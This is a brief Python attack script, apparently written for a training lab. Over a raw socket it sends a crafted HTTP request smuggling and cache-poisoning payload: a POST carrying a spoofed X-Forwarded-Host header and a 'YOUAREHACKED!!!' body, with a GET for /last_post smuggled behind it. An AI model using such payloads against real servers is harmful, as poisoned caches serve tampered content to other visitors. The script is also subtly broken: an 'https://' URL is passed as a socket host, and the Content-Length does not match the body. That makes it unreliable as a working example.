
import socket

HOST = 'https://lap3-http_request_smuggling_cache_poison.labs-is-here.online'  # Адрес твоего сервера
PORT = 80        # Порт (если Flask dev-сервер, то 5000)

payload = (
    "POST /post/1 HTTP/1.1\r\n"
    "Host: lap3-http_request_smuggling_cache_poison.labs-is-here.online\r\n"
    "Content-Length: 19\r\n"
    "X-Forwarded-Host: hacked\r\n"
    "\r\n"
    "body=YOUAREHACKED!!!"
    "GET /last_post HTTP/1.1\r\n"
    "Host: vuln.lab\r\n"
    "\r\n"
)
#
with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())
# import ssl
#
# with socket.create_connection((HOST, PORT)) as sock:
#     context = ssl.create_default_context()
#     with context.wrap_socket(sock, server_hostname=HOST) as ssock:
#         ssock.sendall(payload.encode())
#         print(ssock.recv(4096).decode())
